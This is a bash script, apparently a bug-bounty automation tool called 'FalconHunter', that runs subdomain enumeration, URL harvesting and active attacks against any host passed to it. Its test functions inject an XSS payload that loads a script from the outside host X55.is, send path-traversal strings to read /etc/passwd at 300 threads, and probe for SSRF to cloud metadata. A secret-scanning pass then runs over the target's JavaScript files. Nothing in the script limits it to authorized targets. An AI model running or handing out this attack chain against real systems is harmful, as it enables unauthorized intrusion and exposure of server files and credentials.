#!/bin/bash

# ANSI color codes for terminal output
BLUE="\033[0;34m"
RED="\033[91m"
GREEN="\033[32m"
END="\033[0m"

# Banner for the script, displayed at the start
banner="${GREEN}    ______            __                          __  __                   __               
   / ____/  ____ _   / /  _____  ____    ____    / / / /  __  __   ____   / /_  ___    _____
  / /_     / __ \`/  / /  / ___/ / __ \  / __ \  / /_/ /  / / / /  / __ \ / __/ / _ \  / ___/
 / __/    / /_/ /  / /  / /__  / /_/ / / / / / / __  /  / /_/ /  / / / // /_  /  __/ / /    
/_/       \__,_/  /_/   \___/  \____/ /_/ /_/ /_/ /_/   \__,_/  /_/ /_/ \__/  \___/ /_/     
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            ${END}"
echo -e "$banner"

mk_dir() {
    local output="$1"
    echo -e "${GREEN}[+] Creating output directory${END}"
    sleep 0.2

    mkdir -p "${output}/hosts" "${output}/urls" "${output}/vuln"
    
    # Create files in hosts directory
    for file in subs.txt httpx.txt alive.txt asn.txt; do
        touch "${output}/hosts/${file}"
    done

    # Create files in urls directory
    for file in all-urls.txt params.txt js-files.txt js-findings.txt mantra1.txt; do
        touch "${output}/urls/${file}"
    done

    # Create gf files in urls directory
    for file in xss.txt lfi.txt ssrf.txt sqli.txt; do
        touch "${output}/urls/gf-${file}"
    done

    # Create vulnerability files in vuln directory
    for file in xss.txt lfi.txt ssrf.txt sqli.txt nuclei-o.txt subdomain-takeover.txt; do
        touch "${output}/vuln/${file}"
    done

    sleep 0.2
    echo -e "${GREEN}[+] Directory successfully created${END}"
}

subdomain() {
    local host="$1"
    local output="$2"
    echo -e "${GREEN}[+] Collecting subdomains for ${host}${END}"
    sleep 0.2

    # Collect subdomains using subfinder and amass
    subfinder -d "${host}" -o "${output}/hosts/subs.txt"
    amass enum -d "${host}" | tee -a "${output}/hosts/subs.txt"

    # Count collected subdomains
    local sub_count
    sub_count=$(wc -l < "${output}/hosts/subs.txt")
    echo -e "${GREEN}[+] Successfully collected ${sub_count} subdomains${END}"
    sleep 0.2
}

probe_subs() {
    local output="$1"
    echo -e "${GREEN}[+] Probing for alive subdomains${END}"

    # Use httpx to check alive subdomains
    httpx -l "${output}/hosts/subs.txt" -sc -title -td -fr -o "${output}/hosts/httpx.txt"

    # Extract alive subdomains
    awk '{print $1}' "${output}/hosts/httpx.txt" > "${output}/hosts/alive.txt"
}

takeovers() {
    local output="$1"
    echo -e "${GREEN}[+] Testing for Subdomain Takeovers${END}"
    subzy run -targets "${output}/hosts/subs.txt" --vuln --output "${output}/vuln/subdomain-takeover.txt"
}

collect_urls() {
    local output="$1"
    local host="$2"
    echo -e "${GREEN}[+] Collecting all URLs and parameters${END}"

    local input_urls="${output}/hosts/alive.txt"
    local output_urls="${output}/urls/all-urls.txt"
    local output_params="${output}/urls/params.txt"

    # Use waymore to collect URLs
    waymore -mode U -i "${input_urls}" -oU "${output_urls}"

    # Use waybackurls and gau to gather URLs
    waybackurls < "${input_urls}" | tee -a "${output_urls}"
    gau --subs < "${input_urls}" | tee -a "${output_urls}"

    # Collect parameters
    grep "=" "${output_urls}" > "${output_params}"
    paramspider -l "${host}"
    cat results/* | tee -a "${output_params}"

    # Filter URLs using gf patterns
    for gf in xss lfi ssrf sqli; do
        gf "${gf}" < "${output_params}" > "${output}/urls/gf-${gf}.txt"
    done
}

test_xss() {
    local output="$1"
    echo -e "${GREEN}[+] Testing for XSS${END}"
    local output_params_xss="${output}/urls/gf-xss.txt"
    local output_xss="${output}/vuln/xss.txt"
    qsreplace '"><script src="https://X55.is?1=18722"></script>' < "${output_params_xss}" | freq | grep -iv 'Not Vulnerable' > "${output_xss}"
}

test_lfi() {
    local output="$1"
    echo -e "${GREEN}[+] Testing for LFI${END}"
    local lfi_wordlist=("/etc/passwd" "../../../../../../../../../../../../../../../../etc/passwd%00" "../../../../../../../../../../../../etc/passwd")
    local output_params_lfi="${output}/urls/gf-lfi.txt"
    local output_lfi="${output}/vuln/lfi.txt"

    for lfi in "${lfi_wordlist[@]}"; do
        httpx -l "${output_params_lfi}" -path "${lfi}" -threads 300 -random-agent -mc 200 -mr 'root:[x*]:0:0:' | tee -a "${output_lfi}"
    done
}

test_ssrf() {
    local output="$1"
    local ssrf_payload="$2"
    echo -e "${GREEN}[+] Testing for SSRF${END}"
    local output_params_ssrf="${output}/urls/gf-ssrf.txt"
    local output_ssrf="${output}/vuln/ssrf.txt"
    qsreplace "${ssrf_payload}" < "${output_params_ssrf}" | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1' | grep "compute.internal" > "${output_ssrf}"
}

find_js_secrets() {
    local output="$1"
    echo -e "${GREEN}[+] Testing for JS secrets${END}"
    local output_urls="${output}/urls/all-urls.txt"
    local java_script_files="${output}/urls/js-files.txt"
    local extract_mantra_findings="${output}/urls/mantra1.txt"
    local save_mantra_findings="${output}/urls/js-findings.txt"
    local nuclei_template_for_js="nuclei-templates/http/exposure/"

    grep "js$" "${output_urls}" > "${java_script_files}"
    mantra < "${java_script_files}" > "${extract_mantra_findings}"
    grep "[+]" "${extract_mantra_findings}" > "${save_mantra_findings}"
    nuclei -l "${java_script_files}" -t "${nuclei_template_for_js}" > /dev/null
}

nuclei_scan() {
    local output="$1"
    echo -e "${GREEN}[+] Initializing nuclei scan${END}"
    local alive_path="${output}/hosts/alive.txt"
    local output_file="${output}/vuln/nuclei-o.txt"
    local output_urls_1="${output}/urls/gf-"
    local output_path="${output}/vuln/"
    local nuclei_templates="NucleiTemplates/centTemplates/"

    if [[ -f "${alive_path}" && -d "${nuclei_templates}" ]]; then
        echo -e "${GREEN}[+] Nuclei active scan${END}"
        nuclei -l "${alive_path}" -t "${nuclei_templates}" -o "${output_file}"
        for gf_1 in xss lfi ssrf sqli; do
            nuclei -l "${output_urls_1}${gf_1}.txt" -t "${nuclei_templates}" -tags "${gf_1}" > "${output_path}/gf-${gf_1}.txt"
        done
    fi
}

main() {
    if [[ $# -ne 3 ]]; then
        echo -e "${RED}[+] Usage: $0 <host> <output-directory> <ssrf-server-or-burpcollab>${END}"
        echo -e "${RED}[+] Example: $0 example.com example-output http://example.com${END}"
        exit 1
    fi

    local host="$1"
    local output="$2"
    local ssrf_payload="$3"

    mk_dir "${output}"
    subdomain "${host}" "${output}"
    probe_subs "${output}"
    takeovers "${output}"
    collect_urls "${output}" "${host}"
    test_xss "${output}"
    test_lfi "${output}"
    test_ssrf "${output}" "${ssrf_payload}"
    find_js_secrets "${output}"
    nuclei_scan "${output}"
}

main "$@"
